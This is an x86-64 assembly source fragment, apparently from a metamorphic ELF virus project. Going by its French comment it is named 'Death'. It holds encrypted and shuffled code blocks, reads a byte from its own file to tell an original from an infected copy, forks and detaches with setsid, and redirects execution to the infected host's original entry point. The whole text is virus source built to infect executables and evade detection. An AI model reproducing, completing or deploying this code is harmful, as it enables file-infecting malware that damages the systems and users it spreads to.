_encrypted_start:
	jmp		encrypted_start
	%include "functions/patchjmp.s"
	%include "functions/shuffle.s"
	encrypted_start:

    PUSH_ALL



	jmp	[rel .addr0r]
	.addr0:	dq 0x421900000000
	.addr0r: dq 0
	start_shuffle:












	; BLOC 0
	dq	1942, 0
	mov		rdi, [rbp + 16]
	add		rdi, mydata.path

	mov		rcx, 512
	xor		rax, rax
	NOP
	NOP
	NOP
	NOP

	NOP
	rep		stosq
	NOP

	mov		rax, [rbp + 16]
	add		rax, mydata.path
	;lea		rax, [rel path]

	mov		[rax], byte '/'
	jmp	[rel .addr1r]
	.addr1: dq 0x421900000001
	.addr1r: dq 0
	dq 0x696900000001


	dq	1942, 1

	mov		rax, [rbp + 8]
	;lea		rax, [rel _start]
	mov		rdi, [rbp + 16]
	;lea		rdi, [rel _stop]


	mov		rax, SYS_open
	mov		rdi, [rbp + 16]
	add		rdi, mydata.self
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	syscall
	cmp		rax, 0
	jmp	[rel .addr2r]
	.addr2: dq 0x421900000002
	.addr2r: dq 0
	dq 0x696900000002
	end_shuffle0:
	dq	1942, 2
	jle		.just_quit
	mov		r12, rax
	mov		rax, SYS_pread64
	mov		rdi, r12
	mov		rsi, [rbp + 16]
	add		rsi, mydata.zero
	mov		rdx, 1
	mov		r10, 10
	syscall


	.just_quit:
	mov		rax, SYS_close
	mov		rdi, r12
	syscall

	POP_ALL
	jmp	[rel .addr3r]
	.addr3: dq 0x421900000003
	.addr3r: dq 0
	dq 0x696900000003
	end_shuffle1:
	dq	1942, 3


	mov		rax, [rbp + 16]
	add		rax, mydata.zero
	mov		al, BYTE [rax]	; SI ICI = 0, ca signfiie c'est Death
	test	al, al
	jz		.continue


	mov		rax, SYS_fork
	syscall


	cmp		eax, 0
	jng		.continue_fork





	mov		rax, [rbp + 16]
	add		rax, mydata.entry
	mov		rax, [rax]

	mov		rdi, [rbp + 16]
	add		rdi, mydata.new_entry
	mov		[rdi], rax

	mov		rax, [rbp + 16]
	add		rax, mydata.new_entry
	mov		rax, [rax]

	mov		rdi, [rbp + 16]
	add		rdi, mydata.old_entry
	sub		rax, [rdi]

	mov		rdi, [rbp + 8]
	;lea		rdi, [rel _start]


	sub		rdi, rax
	mov		rax, [rbp + 16]
	add		rax, mydata.new_entry
	mov		[rax], rdi




	add		rsp, 64
	jmp		[rax]


.continue_fork:

	mov		rax, SYS_setsid
	syscall
.continue:
	jmp	[rel .addr4r]
	.addr4: dq 0x421900000004
	.addr4r: dq 0
	dq 0x696900000004
	end_shuffle2:
	dq	1942, 4
